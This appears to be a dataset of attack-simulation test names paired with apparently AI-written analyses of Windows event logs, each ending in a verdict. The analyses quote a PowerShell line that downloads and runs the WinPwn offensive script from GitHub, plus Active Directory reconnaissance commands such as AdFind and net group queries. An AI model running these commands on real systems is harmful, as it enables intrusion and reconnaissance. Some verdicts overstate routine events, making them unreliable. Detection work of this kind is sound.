   - **Event ID 4624 and 4672:** These events indicate successful logons under the SYSTEM account using the Advapi process, which often corresponds to services starting or a scheduled task being executed. The privileges listed in event 4672 include several high-level privileges associated with a SYSTEM account.
   - **Event ID 4798:** This event involves querying information about user accounts like Administrator and other users such as ""admin_test"". This could be part of routine security assessments but can also indicate account enumeration attempts.

2. **Sysmon Logs:**
   - There are numerous instances of ""wevtutil.exe"" and ""cmd.exe"" being executed by a user ""admin_test"", potentially suggesting command-line activity that might be used for administrative tasks.
   - There is evidence of the usage of ""AdFind.exe"", which is a command-line Active Directory query tool, indicating potential enumeration of Active Directory objects (e.g., exchange addresses). Such activity can sometimes reflect routine network administration but may also suggest reconnaissance activities.
   - **Host Process Execution:** Multiple executions of legitimate Windows utilities (e.g., conhost.exe, svchost.exe, hostname.exe) are typically associated with normal operations.

3. **Application and System Logs:**
   - **Edge Update and Windows Defender:** These logs indicate regular operations and updates of Microsoft Edge and Windows Defender. No immediate signs of suspicious or malicious behavior were noted in the application logs.

### Suspicious Indicators:
- The usage of AdFind.exe in combination with cmd.exe and the presence of wevtutil command-line operations could potentially signify reconnaissance activities.
- Enumerating user accounts multiple times within a short timeframe might imply an attempt to gather user credentials.

### Recommendations:
Given these observations, the activities noted can be typical of network or system administrators performing regular maintenance or investigative tasks. However, the presence of reconnaissance tools and repeated account enumeration deserves a closer look to rule out malicious intent. It would be prudent to:
  
- Review any user activities involving the ""admin_test"" account.
- Verify with the system administrator if the use of AdFind and enumerating accounts was authorized and aligns with typical system maintenance schedules.
- Confirm the legitimacy of any scripts or tasks executing from ""cmd.exe"" with such tools.

### Resolution:
**SUSPICIOUS -** The activities observed depict potential preliminary reconnaissance, which might indicate a preparatory phase for more sophisticated attacks but require further investigation to conclusively determine their intent. More data or context is needed to classify it definitively as either benign or malicious."
Suspicious LAPS Attributes Query with Get-ADComputer all properties,"After thoroughly analyzing the provided Windows event logs, I've identified the following notable details:

1. **Process Execution**:
    - **wevtutil.exe**: This utility is primarily used to manage the Windows event logs. It is observed to be running multiple times under the user ""SERVER002\\admin_test"". While legitimate in administrative operations, frequent execution could be a red flag if not performed by authorized personnel.

    - **Other Executions**:
        - **HOSTNAME.EXE**, **whoami.exe**: These are standard utilities used to retrieve the computer name and current user information. Their frequency here does not directly indicate malicious intent, but could be associated with reconnaissance activities.
        - **powershell.exe**: The execution of PowerShell with a command `Get-ADComputer` is observed. This could suggest active directory-related operations, possibly for reconnaissance or administrative tasks.

2. **Command-Line Arguments**: 
    - No overly suspicious command-line arguments are seen with potentially dangerous flags or commands. The use of PowerShell with Get-ADComputer isn't inherently malicious but should be checked against expected behavior.

3. **Security Context**:
    - **Integrity Levels**: Processes are observed to be executed at High integrity levels, typical for administrative tasks.

4. **Parent-Child Process Relationships**:
    - Processes such as `wsmprovhost.exe` (typically related to remote management) are seen as parent processes, which aligns with distant administrative control.

5. **Edge Update Process**:
    - The repeated execution of Microsoft Edge Update processes suggests an update sequence. Edge-related files and executions do not show signs of alteration or impersonation.

6. **Temporal Pattern**:
    - Activities occurred in rapid succession, indicating automated tasks or scripts but not necessarily malicious.

7. **PowerShell Logging**:
    - The event logs related to PowerShell show basic provider loading, indicative of a session keen on interacting with system-level information.

8. **System, Security, and Application Logs**:
    - Time adjustments and network-related processes are logged without anomalies. No failed logins or access violations were noted.

**Assessment**: 

- Based on the logs, there’s significant use of system-level tools by a user with admin-like privileges grouped closely in time, which can indicate either standard administrative operations or potential lateral movement in a targeted attack scenario. The presence of PowerShell commands accessing Active Directory raises some concern.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Verify the legitimacy of the user ""SERVER002\\admin_test"" and confirm their authorized duties on the host.
- Check if the commands executed align with normal administrative tasks; if not, investigate any anomalies or unauthorized access.
- Ensure auditing and alerting mechanisms are in place for sensitive commands and privilege-level changes.
- Consider implementing more detailed PowerShell logging for early detection of potentially harmful scripts."
Suspicious LAPS Attributes Query with adfind all properties,"Upon analyzing the provided Windows event logs, several elements stand out as potentially suspicious:

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - The logs show multiple executions of processes such as `wevtutil.exe` and `conhost.exe`, with no specific accompanying command-line arguments. `wevtutil.exe` is primarily used for event log management and querying logs. Regular and multiple executions of this tool in a short timeframe may suggest an attempt to either clear logs or view them unauthorizedly.

2. **Unusual PowerShell Activity:**
   - The logs reveal a PowerShell execution with the command line involving `AdFind.exe`. The command seems to be querying Active Directory data: ` ""& {& \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\AdFind.exe\""  -h $env:USERDOMAIN -s subtree -f \""objectclass=computer\"" *}""`.
   - `AdFind.exe` is a legitimate tool, but it's often used by attackers post-exploitation to gather information about an Active Directory environment.
   - The PowerShell command runs from a temporary folder, which can indicate potentially non-standard or unauthorized use.

3. **Execution of `whoami.exe` and `hostname.exe`:**
   - `whoami.exe` and `hostname.exe` are executed, which by themselves are benign, but in the context of a breached environment, attackers use them to identify the current user and host information.

4. **Time Change Events:**
   - The logs include time changes initiated by `svchost.exe` with the ProcessID ""2064"". These could be legitimate time synchronization activities, but if unauthorized, altering system time is a tactic used to evade detection (i.e., timestamp obfuscation in log entries).

**Assessment:**
- The behavior noted in the logs, especially the PowerShell execution with external tools (`AdFind.exe`) and the frequency and context of `wevtutil.exe` usage, warrants further investigation as these indicate methods typically employed by attackers following an initial compromise to perform reconnaissance or anti-forensic actions.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
1. **Conduct a Deeper Investigation:**
   - Investigate who initiated these processes. Look for any unauthorized access or anomalies in user login activities.
   - Evaluate whether `AdFind.exe` usage is legitimate by contacting the involved user or responsible IT personnel.

2. **Review Other Logs and Indicators:**
   - Check network logs for any unusual outbound connections that may correspond to data exfiltration or command and control.
   - Look into file access logs to see if there are signs of unauthorized data access or copying.

3. **Implement Monitoring and Alerts:**
   - Set up alerts for future similar activities involving tools like `AdFind.exe`, `wevtutil.exe`, and suspicious PowerShell commands.
   - Use security tools to monitor critical systems for further abnormal behavior.

4. **Assess and Enhance Security Controls:**
   - Consider deploying enhanced monitoring and threat detection tools which can detect and alert on similar behavior.
   - Conduct a thorough review and strengthen user access controls and permissions where necessary."
Enumerate Active Directory for Unconstrained Delegation,"Upon reviewing the provided Windows event logs, it is essential to conduct a detailed assessment to identify any potential indicators of malicious activity. Here is the analysis:

### Windows PowerShell Logs:
- **Executed Command**: A PowerShell command was executed: `powershell.exe & {Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain}`.
- **Purpose of Command**: This command aims to query Active Directory for objects with specific user account control settings, particularly accounts marked as ""Trusted for Delegation"".
- **Context**: Although querying Active Directory is expected in environments managed via PowerShell, this specific command could be indicative of reconnaissance related to privilege escalation tactics, aiming to identify accounts with elevated privileges.

### Sysmon Logs:
- **Frequent Command Executions**: The logs exhibit multiple executions of `conhost.exe`, `wevtutil.exe`, and `whoami.exe`. Such programs are typically benign:
  - `conhost.exe`: Host for console windows.
  - `wevtutil.exe`: Utility for managing Windows event logs.
  - `whoami.exe`: Displays the current user context.
- **PowerShell and Administrative Users**: The logs confirm the execution of PowerShell and several console applications like `whoami.exe` under the user `SERVER002\admin_test`, a user with administrative privileges. Repeated executions and their conjunction with administrative privileges could denote potential lateral movement or privilege escalation attempts.

### Application Logs:
- **Edge Update**: The presence of several logs related to `MicrosoftEdgeUpdate.exe` indicates normal update operations for Microsoft Edge. Though benign, it shows activity at the time period investigated.

### Key Observations:
1. **PowerShell Reconnaissance**: The execution of a PowerShell command querying Active Directory objects with elevated permissions is noteworthy. This may be part of a larger attack campaign aiming to escalate privileges or map an organization's sensitive accounts.
   
2. **Administrative Activity**: The machine in question is possibly being operated or managed by users with high privileges (`SERVER002\admin_test`). Discerning whether such activity aligns with routine administrative tasks is crucial.

### Conclusion:
- **Resolution**: SUSPICIOUS
- **Reasoning**: Although no direct evidence of compromising activities such as malware execution or unauthorized access was found, the querying of Active Directory for privileged accounts, combined with admin-level PowerShell usage without clarity of intent, calls for further investigation. The possibility of reconnaissance as part of a broader attack chain cannot be ruled out.

### Guidance for Further Investigation:
1. **Authenticate Command Origin**: Validate if the `Get-ADObject` command execution aligns with authorized administrative tasks or ongoing security assessments.
2. **Review PowerShell Transcripts**: If PowerShell transcription logging is enabled, review the scripts executed to understand the full context.
3. **User Access and Changes**: Verify any changes, additions, or modifications to user accounts or group memberships around the log time.
4. **Network Traffic Analysis**: Inspect network logs for unusual traffic patterns or connections from `Server002` during the period in question. 

These steps will help ascertain whether the activities require mitigation actions or are simply benign administrative routines."
Discover System Language by Windows API Query,"Upon analyzing the provided logs from the System, Security, Sysmon, and Application channels, the following observations and analysis are made:

### Security Log Observations

- **Event ID 4624 (Logon Events):** Multiple logon attempts with `LogonType 5`, which indicates a service startup, is shown consistently for SYSTEM account logons, which seems to be routine activity for service-related operations.

- **Event ID 4672 (Special Privileges Assigned):** SYSTEM account entries with built-in privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege` are seen frequently. This is typical for a SYSTEM-level operation and does not immediately imply malicious behavior.

- **Event ID 5379 (Credential Validation):** Several attempts to validate credentials related to services linked to Microsoft accounts and Windows Live services. All have a return code `3221226021`, which typically indicates an unsuccessful attempt or failure. While these could be seen as failed attempts at credential operations, they are likely linked to automated service processes rather than explicit attempts at compromise, given their association with SYSTEM-level operations.

- **Event ID 4798 (Security Group Enumerations):** Frequent enumerations of security groups for accounts such as `Administrator`, `admin_test`, `DefaultAccount`, and `Guest` using `C:\Windows\System32\taskhostw.exe`. Frequent group enumerations can indicate privilege reconnaissance activities, but the enumerations here correspond to standard system accounts and seem not unusual without further context.

### Sysmon Log Observations

- **Process Executions:** Several benign system processes like `svchost.exe`, `conhost.exe`, and `CompatTelRunner.exe` are executed under SYSTEM and NT AUTHORITY contexts. These processes are common for routine Windows operations.

- **Potential Anomaly - Sysmon Process Execution Event (ID 1):** A potentially suspicious process is `LanguageKeyboardLayout.exe` executed from a Temp directory by `cmd.exe`. This execution is unusual because:
  - The executable runs from a temporary directory, a typical location for staging malicious payloads.
  - The executable lacks descriptive metadata (file version “0.0.0.0”, Company “-”), which is atypical for legitimate software.

### Summary & Conclusion

Considering these log observations:

- The **repetition of certain credential validation failures** and **system account enumeration** might be cause for concern but without further detail or failure patterns linked to external accounts or non-standard activity, they could represent non-malicious system/service misconfigurations or automated attempts.

- The **execution of `LanguageKeyboardLayout.exe`** from a temporary path marks the most significant red flag. The presence of an executable in a temp directory with no descriptive metadata suggests potential malicious usage or a dropped payload. This warrants further investigation to verify its origin and purpose.

### Resolution

Given the combination of potential indicators and typical secure system operations, the logs suggest activity that is:

- **SUSPICIOUS** - While much of the activity could be benign as part of usual system operations, the presence and execution context of `LanguageKeyboardLayout.exe` suggest it requires further investigation to rule out malicious action or intent.

### Recommendations

1. **Investigate `LanguageKeyboardLayout.exe`:** Determine its origin, hash it for comparison against known malware databases, and check any network activity or further file writes post-execution.
2. **Review failed credential attempts (Event ID 5379):** To diagnose if they indicate misconfigurations or potential probing from unintentionally permitted services.
3. **Proceed with enhancing monitoring:** Particularly around the accounts and processes involved in these entries.

Based on findings, take appropriate remediation actions such as quarantining the file, revoking unnecessary privileges, or addressing potential misconfigurations."
Detect a Debugger Presence in the Machine,"Upon reviewing the provided Windows event logs across various channels, I have made the following observations:

### System Log
- **Time Service and Time Adjustment Events**: Several events indicate the system time being adjusted using the Windows Time Service with reference to `time.windows.com`. The time was changed to an earlier time due to synchronization (`EventID 4616`). These events seem routine as they ensure time accuracy.
- **Kernel General Events**: These include records of time changes and timezone updates, typical for normal system operation.

### Windows PowerShell Log
- **PowerShell Events**: Logs show PowerShell instances starting with a script to check for debugger processes. While the presence of debugging checks could suggest development or troubleshooting activities, these alone are not necessarily malicious. However, it raises an eyebrow for further context checking, especially around the time of log occurrences.

### Security Log
- **Security Auditing Events**: Recorded events show typical login and logoff activities, with some involving users with elevated privileges (`admin_test`). The use of NTLM for authentication, consistent login timestamps, and privilege assignments appear standard in administrative scenarios.
- **Privilege Use**: An event (`EventID 4672`) records privileges such as `SeDebugPrivilege` being assigned. Although privileges like `SeDebugPrivilege` can be used for nefarious activities, these are often necessary for administrative functions and, alone, do not indicate maliciousness without further context.

### Sysmon Log
- **Sysmon Events**: Multiple process creation events involving common system processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`, and various Microsoft Edge Update activities. The Microsoft Edge services and updates executed under `NT AUTHORITY\SYSTEM` seem legitimate as part of application maintenance.
  
### Application Log
- **Edge Update Service Stopped**: Edge Update service stopping and starting could reflect routine update mechanisms.

### Analysis & Conclusion
Overall, the logs do not show definitive indicators of compromise or malicious behavior. The activities logged span regular system operations such as time synchronization, PowerShell sessions associated with process checks, standard administrative logins with requisite privileges, and legitimate software updates. No unusual or unauthorized access attempts or process anomalies were identified.

### Resolution
**BENIGN**: The observed activities in the logs appear routine and benign. However, awareness to the PowerShell scripts performing debugger checks and privilege usage is important. It is advisable to ensure these activities align with organizational norms, especially if this is part of authorized troubleshooting or development work."
User Discovery With Env Vars PowerShell Script,"Upon reviewing the provided Windows event logs, I will break down each type of log (Security, Application, System, Sysmon, and PowerShell) to identify any suspicious activity, and provide an overall assessment based on these findings.

### Security Log Analysis:
- **Event ID 5379**: This event collection indicates API calls related to Credential Manager operations returning an error code (`3221226021` - STATUS_NO_SUCH_LOGON_SESSION), which is common if no credentials were retrieved or the session is invalid. 
- No unusual user accounts or privilege escalations are noticed. The events seem routine and contain no direct signs of malicious activity.

### Application Log Analysis:
- **Windows Defender State**: The entry shows Windows Defender is operational (`SECURITY_PRODUCT_STATE_ON`). This implies the security software is active and not disabled, which is a positive sign indicating protective measures.

### System Log Analysis:
- **Event ID 44, 43, and 19**: These show a Windows Defender update occurred without error. Such updates are routine actions from Windows Update and do not suggest malicious activity.

### Sysmon Log Analysis:
- Several benign entries related to standard utility executions (`whoami.exe`, `hostname.exe`, `wevtutil.exe`, `conhost.exe`) were observed. The execution of `whoami.exe` and `hostname.exe` is often used for system checks.
- **Powershell Execution**: A command writing user information to a file (`CurrentactiveUser.txt`) executed in a temp directory. While it could be part of legitimate auditing, it is unusual enough to merit further inquiry, especially given its timing and location.

### Windows PowerShell Log Analysis:
- The PowerShell commands primarily focused on outputting the currently logged-in user to a text file, both the environment variable and the system environment extracted information. While this execution itself isn't overtly malicious, it is unexpected behavior that could indicate initial stages of reconnaissance.

### Assessment:
- **SUSPICIOUS**: While the majority of the activities seem routine, the usage of PowerShell to output user information to a file in a temporary directory is somewhat odd and should not be immediately dismissed. This activity suggests potential reconnaissance or scripting that may warrant deeper analysis.

### Recommendations:
1. **Review User Activity**: Investigate who initiated the PowerShell command and in what context, including checking the `admin_test` user's intentions.
2. **File System Check**: Inspect the `CurrentactiveUser.txt` file for any evidence of modification or other suspicious scripts within the same directory.
3. **Network Logs**: Consider identifying any corresponding anomalies within network logs around this period to ascertain if this host was communicating unusually with external entities.
4. **Continuous Monitoring**: Set up alerts for abnormal or unauthorized PowerShell usage and script executions in non-standard file paths moving forward.

Overall, while the activity identified does not definitively confirm a breach, it represents a deviation from usual behavior that warrants further investigation to understand context and prevent potential future incidents."
File and Directory Discovery (PowerShell),"Upon reviewing the provided Windows event logs, the analysis focuses on identifying any potentially suspicious or malicious activities. Here are the key observations from the logs:

1. **Frequent Use of `wevtutil.exe` and `conhost.exe`:**
   - The logs show numerous executions of `wevtutil.exe`, a native Windows tool used for managing event logs, followed by `conhost.exe` which is commonly associated with the console processes.
   - Both processes were frequently initiated by the user `SERVER002\\admin_test` at very short intervals. While the usage of `wevtutil.exe` itself is not inherently malicious, its repeated rapid invocation may suggest automation or script execution, which warrants further scrutiny.

2. **PowerShell Activity with Recursive Commands:**
   - There is a record of `powershell.exe` being invoked with commands that include `ls -recurse`, `get-childitem -recurse`, and `gci -recurse`.
   - Recursive listing commands can be indicative of enumeration activity, which might be used by an attacker to gather information about directory contents extensively.
   - The PowerShell invocation was started from the directory `C:\Users\ADMIN_~1\AppData\Local\Temp\`, a temporary directory that might be used for executing temporary scripts downloaded or copied during an attack.

3. **Time Anomalies:**
   - There are several entries pointing towards a time change in the system logs with related changes in the security logs, indicating that the system time was altered.
   - This could be benign, as incorrect time sync might cause sporadic time corrections, but in some scenarios, changing system time can be indicative of malicious attempts to cover tracks by avoiding detection based on timestamps.

4. **Execution of Standard Windows Tools:**
   - Tools such as `hostname.exe`, `whoami.exe`, and `svchost.exe` are executed according to Sysmon logs. These are legitimate Windows tools often used for system information gathering similar to reconnaissance.

5. **No Direct Indicators of Malicious Payload or Control:** 
   - There is no direct evidence or hash values showing known malicious activity or payloads being executed.
   - The events do not demonstrate clear indications of privilege escalation or lateral movement that is often associated with confirmed breaches.

**Assessment & Guidance:**

- **Resolution: SUSPICIOUS**: While no definitive malicious activities or breaches are identified in these logs, the frequent and rapid execution of system utilities (`wevtutil.exe`, `powershell.exe` with recursive commands) suggests suspicious activity potentially consisting of automated tasks or extensive enumeration that requires in-depth analysis to rule out illicit activities.
  
- **Next Steps:**
  1. **Investigate User Behavior:** Review activities performed by the `SERVER002\\admin_test` account, focusing on understanding the purpose and context of usage for `wevtutil.exe` and `powershell.exe`.
  2. **Review Scripts or Automation Tools:** There might be scripts scheduled through Task Scheduler or initiated by third-party applications resulting in this behavior—cross-verify with scheduled tasks or any automation tools in use.
  3. **Check for Anomalies in Other Logs:** Review other logs and systems for any corresponding anomalies or indicators of compromise that align with the behavior seen here.
  4. **Monitor for Recurrent Activities:** Put monitoring in place for the recurrence of similar events, and acquire additional logging or threat intelligence for further investigation.

Given these contexts, further investigation is necessary to ensure no latent threats are present within the system, and to understand the motivations behind these actions."
Elevated group enumeration using net group (Domain),"### Detailed Log Analysis

#### Sysmon Logs
1. **Microsoft Edge Update Activity**:
   - Frequent execution of `MicrosoftEdgeUpdate.exe` along with various update helper binaries (`MicrosoftEdgeUpdateComRegisterShell64.exe`) can be observed.
   - These processes are executing under `NT AUTHORITY\SYSTEM`, which is typical for software update processes and does not directly indicate malicious behavior.
   - The structure and integrity of the involved files (verified by file metadata such as version and company name) match expected properties for a benign update operation.

2. **Command Execution**:
   - A `cmd.exe` process is executed from a temporary directory with a detailed command line involving various `net group` commands: `""cmd.exe"" /c net groups ""Account Operators"" … ""Domain Admins""`.
   - This indicates querying of user groups from domain level, which could be a legitimate admin activity but could also indicate malicious reconnaissance, possibly performed to gather information about domain user privileges.

3. **Use of Built-in Windows Tools**:
   - Several Windows utilities, such as `whoami.exe`, `hostname.exe`, and `wevtutil.exe`, are executed under the user `SERVER002\admin_test`.
   - Utilities like `whoami` and `hostname` are often part of legitimate checks for user identity or system hostname but can also be utilized in malicious workflows to retrieve system information.
   - `wevtutil.exe` is used primarily for managing event logs. Frequent use by non-system processes can be suspicious, although there isn't explicit indication of malicious intent in the sequences provided.

#### Security Logs
- **User Logons and Privilege Use**:
  - A login event (`4624`) and a privileges assignment event (`4672`) for the user `admin_test` are recorded. The privileges include high-level rights such as `SeDebugPrivilege` and `SeBackupPrivilege`, often used in administrative and potentially malicious activities.
  - The logon type `3` indicates a network logon event, which is typical for remote interactions but raises a red flag when combined with privileged account operations.

#### Summary of Findings
- **Suspicious Activity**:
  - The execution of a command line with multiple `net group` commands by `admin_test` suggests potential reconnaissance activity.
  - The presence of high-level privileges assigned to `admin_test` adds a layer of suspicion.
  - There's no explicit indication of data alteration or compromise; however, the behavior could align with that of an insider threat or a compromised account used for domain information gathering.

- **Benign Activities**:
  - Microsoft Edge Updates and automated system updates appear normal and align with typical maintenance operations, verified by file attributes and expected operational context.

### Resolution
**Resolution: SUSPICIOUS**

#### Guidance on How to Proceed
1. **Immediate Monitoring**: 
   - Increase monitoring on the account `admin_test` for any further suspicious behavior, especially activities involving high-level privileges.
   
2. **Network Analysis**: 
   - Review network access patterns and history for `admin_test` to understand the context of the group enumeration commands.

3. **Access Verification**: 
   - Verify whether `admin_test` actions are consistent with their role. If unauthorized, consider updating security policies or instituting additional access controls.

4. **SIEM Correlation**: 
   - Correlate these log activities with other security tools like endpoint detection and response solutions to identify any potentially malicious threads or scripts executed under this account.

5. **User Validation**: 
   - Engage with the user (if appropriate under security protocols) to validate recent activity. If this activity is legitimate (e.g., part of a scheduled audit or security assessment), document and monitor closely for deviations.

By treating these findings as suspicious, you can mitigate potential risks while you gather more information to confirm the activities' intents."
WinPwn - powerSQL,"Based on the provided logs, several indicators suggest potential malicious activity or at least behavior warranting further investigation:

1. **PowerShell Activity**: The logs indicate the use of PowerShell to execute a script from a URL associated with the user ""S3cur3Th1sSh1t"" on GitHub:
   - Command: `""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'), powerSQL -noninteractive -consoleoutput}`
   - Downloading and executing scripts from the internet, especially from non-official or non-trusted sources, is a common technique used by attackers to deploy malicious payloads.

2. **Process Execution**: Multiple instances of processes such as `conhost.exe`, `wevtutil.exe`, and `whoami.exe` are observed, potentially indicating command-line or script-based automation or remote execution. While these processes are legitimate under normal circumstances, their frequency and the context in which they are used here (potentially tied with the PowerShell script execution) can be suspicious.

3. **Privilege Usage**: The Windows Security Auditing logs (Event ID 4672) show the assignment of several high-privilege tokens, including `SeDebugPrivilege`, which attackers often use to manipulate or debug system processes.

4. **Sysmon Logs**: These logs confirm suspicious activity with process executions linked to potentially downloaded and executed scripts from the internet, as indicated in the PowerShell logs.

5. **Repetitive Credential Access Attempts**: There are multiple occurrences of Event ID 5379 in the Security logs, which are Credential Manager events. The unsuccessful attempts could indicate unauthorized access attempts or automated brute force attempts.

Given these observations, the situation is marked as **SUSPICIOUS** due to the presence of potential risk factors such as the execution of PowerShell scripts from the internet and unusual process activities. Further investigation is required, including:
- Verifying the contents and intent of the script being downloaded and executed.
- Monitoring network activity for any unauthorized data exfiltration or communication with external servers.
- Reviewing any changes made by processes that leverage high privileges.
- Contacting involved personnel to verify any legitimate reasons for this activity, such as scheduled testing or updates conducted manually or by authorized tools.

Resolution: **SUSPICIOUS**"
System Owner-User Discovery,"**Findings and Analysis:**

Upon reviewing the provided logs, several points were noted that warranted closer inspection:

1. **Security Log Observations:**
   - Event ID 4798 logs refer to certain user enumerations performed by the process `C:\Windows\System32\wbem\WmiPrvSE.exe` with user `admin_test`. This action itself is not inherently malicious but can be leveraged by attackers to gather information about user accounts on the system. Enumeration occurred for multiple accounts like `Administrator`, `DefaultAccount`, `Guest`, `lplui`, `sshd`, `testing`, and `WDAGUtilityAccount`.
   - Event ID 5379 logs suggest failed attempts to access some form of authentication/credential information connected to a Microsoft account. While the return codes (3221226021) indicate failures, such repeated access attempts could be an indication of reconnaissance or attempted credential dumping.

2. **Sysmon Log Observations:**
   - The execution of `cmd.exe` with various commands in a scripted manner stands out:
     - Processes such as `whoami.exe`, `wmic useraccount get /ALL`, `qwinsta.exe`, and related session enumeration commands were executed. This could be part of a scripted attempt to gather system and user information, indicative of a post-exploitation reconnaissance stage of an attack.
     - The command sequence seems to be gathering information about active sessions and users, which is suspicious and not typical for regular administrative tasks.
   - Processes executed by `admin_test` with `High` integrity could indicate elevated privileges, which if not typical for this account, could be alarming.
   
3. **System Log Observations:**
   - Routine Windows Defender updates (e.g., `Security Intelligence Update for Microsoft Defender Antivirus`) were observed and these entries look benign as they are typical for maintaining system protection.

**Assessment:**

The activities observed, specifically the use of `cmd.exe` with extensive user and session enumeration commands, the suspicious attempts to access Microsoft account credentials, and the high frequency of user enumeration logs utilizing `WmiPrvSE.exe`, suggest that they may be part of unauthorized or malicious investigation efforts on the system. If such scripting and reconnaissance actions weren't initiated by a known, verified administrator, these actions are suspicious.

**Resolution: SUSPICIOUS**

These activities warrant further investigation as they do not fit typical administrative behavior and could indicate potential reconnaissance by an attacker. It is advisable to:

- Verify the legitimacy of the `admin_test` account actions and its necessity for having scripts that enumerate user accounts and sessions.
- Conduct a full audit trail review of `admin_test` to validate or rule out its involvement in unauthorized entries or actions.
- Closely monitor and possibly restrict the elevated privilege sessions by unexpected accounts.
- Consider Threat Hunting to determine if any other systems exhibit similar behavior or if this host has communicated with suspicious IPs or domains.

If any unauthorized actions are confirmed, further steps including account disabling, password changes, and possibly more comprehensive incident response measures must be considered."
WinPwn - GPORemoteAccessPolicy,"Upon detailed analysis of the provided logs, several points stand out that demand attention:

### PowerShell Logs:

1. **Execution of External Scripts**: 
   - The logs indicate the execution of a PowerShell script fetched from an external repository URL: `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`.
   - Use of `iex(new-object net.webclient).downloadstring(...)` is a common method used for executing remote scripts and is considered a harmful practice due to its potential misuse.

2. **Suspicious Command**:
   - The script executed involves `GPORemoteAccessPolicy -consoleoutput -noninteractive`, which might imply changes in Group Policy, specifically regarding remote access, which can be a sign of malicious activity.

### Security Logs:

1. **Time Manipulation (Event ID 4616)**:
   - There's an adjustment in system time which is often an indicator of attack techniques known as Time Stamp Manipulation. It may be used to hide activities or tamper with log records.

2. **Privilege Escalation Events (Event ID 4672)**:
   - Privileges like `SeDebugPrivilege`, `SeLoadDriverPrivilege`, and others were used by `admin_test`, indicating potentially unwanted privilege escalation.

3. **Multiple Logon Sessions and Privileges**:
   - Multiple sessions for the user `admin_test` with high-level privileges are noted, which could imply unauthorized access or use of stolen credentials.

### Sysmon Logs:

1. **Process Creation**:
   - The presence of unknown processes (indicated by `&lt;unknown process&gt;`) and repeated execution of `wevtutil.exe` and `conhost.exe` linked to `admin_test` suggest unusual behavior. `wevtutil.exe` is normally used to query logs and could be leveraged for malicious purposes.

### System and Application Logs:

- These logs showed standard operations without immediate indicators of compromise. Windows Defender logs indicated it was switched on, albeit this doesn’t negate prior disabling during a possible attack.

### Conclusion:

The logs display behaviors that align with tactics used in attacks, such as the execution of potentially malicious scripts from external sources, adjustments to system time, and elevated privileges for sensitive operations, all of which are suspicious.

### Resolution: MALICIOUS

Given these actions, there are strong indicators of compromise. Immediate actions are required:
1. **Isolate the System**: Disconnect potentially compromised systems from the network.
2. **Conduct a Full Security Audit**: Assess if other systems might be affected.
3. **Prevent Further Access**: Change credentials, especially for high-privilege accounts.
4. **Examine Host Memory and Disk**: Look for suspicious files and scripts that could have been downloaded and executed.
5. **Review Network Logs for Data Exfiltration**: Check if any data might have been transferred to unauthorized external paths.

### Guidance:

- Conduct a forensic investigation to uncover the scope and scale of the breach.
- Restore affected systems from clean backups after eradication of threats.
- Implement strict monitoring and logging policies to detect future anomalies."
Enumerate Active Directory Users with ADSISearcher,"### Analysis:

1. **PowerShell Logs:**
   - A series of PowerShell execution events were noted (EventRecordIDs 1043 to 1050) involving the command `([adsisearcher]""objectcategory=user"").FindAll(); ([adsisearcher]""objectcategory=user"").FindOne()`. This command uses PowerShell to query Active Directory for user objects, which might be part of routine administrative tasks or scripts but can also indicate reconnaissance activities typical in attack scenarios.

2. **Application Logs:**
   - Windows Defender is actively monitoring (EventRecordID 2386), and it appears there were routine updates and processes related to Microsoft Edge updates (EventRecordIDs 2387-2389). The Edge update activity seems benign as the logs show legitimate update processes executed by an authoritative source (Microsoft Corporation).

3. **System Logs:**
   - Time synchronization events were noted (EventRecordIDs 3569 and 3570) which are normal system operations performed by the Windows Time Service, indicative of routine time correction.

4. **Sysmon Logs:**
   - The logs indicate multiple instances of legitimate Windows services and applications being executed by users with elevated credentials (most notably the ""admin_test"" user and system-level services). Programs such as `svchost.exe`, `wevtutil.exe`, etc., were executed. 
   - The recon activities such as `whoami.exe` and `hostname.exe` were executed, which individually can be routine but collectively when near the PowerShell AD queries may warrant further review.

5. **Security Logs:**
   - There were changes made to the system time (EventID 4616), which coincide with the kernel general events. These could be system-initiated corrections and generally appear benign unless associated with ill-intent activities.

### Suspicious Activities Identified:
- The execution of PowerShell commands querying Active Directory (using `ADSISearcher`) in combination with network service processes (`whoami.exe`, `hostname.exe`) may suggest reconnaissance or credential enumeration.
  
### Assessment and Resolution:
Based on the analysis of event logs incorporating command-line arguments, process executions, and other markers, there are no definitive indicators of compromise with 100% certainty, but there are suspicious activities that would warrant a closer and more contextual investigation.

- **Resolution: SUSPICIOUS**

### Recommendations for Next Steps:
- **Detailed Review:** Conduct a deeper analysis of the user account ""admin_test"" activities to verify the legitimacy of the PowerShell command usage and correlate with user intent.
- **Behavioral Analysis:** Monitor for continued similar activities or any attempt of network-wide queries or privilege escalation.
- **Enhanced Monitoring:** Establish triggers for alerts on similar PowerShell AD queries and process executions, especially by users not designated with administrative or network maintenance roles.
- **User & Access Review:** Verify the necessity and authorizations of the user account ""admin_test"" to ensure it complies with role-based access principles."
BIOS Information Discovery through Registry,"Upon reviewing the provided Windows event logs, the following observations and analyses can be made:

### Application Log:
- **Microsoft-Windows-Security-SPP Event (EventID 16384)**: This event is from the Software Protection Platform Service, which checks for activation and licensing. The timestamp is consistent with regular activity, and there is no indication of anomalies or suspicious behavior.
- **Edge Update Events**: Multiple events indicate the stopping of the ""edgeupdate"" service. This might occur during regular operations such as updates or system reboots. No further details are provided that might suggest malicious activity.

### Security Log:
- **Time Change Events (EventID 4616)**: These events indicate a system time change initiated by the LOCAL SERVICE account. The changes are minor and likely related to system time synchronization with a time server (as indicated by the corresponding System log entry). This is typical behavior and part of standard time synchronization operations.

### Sysmon Log:
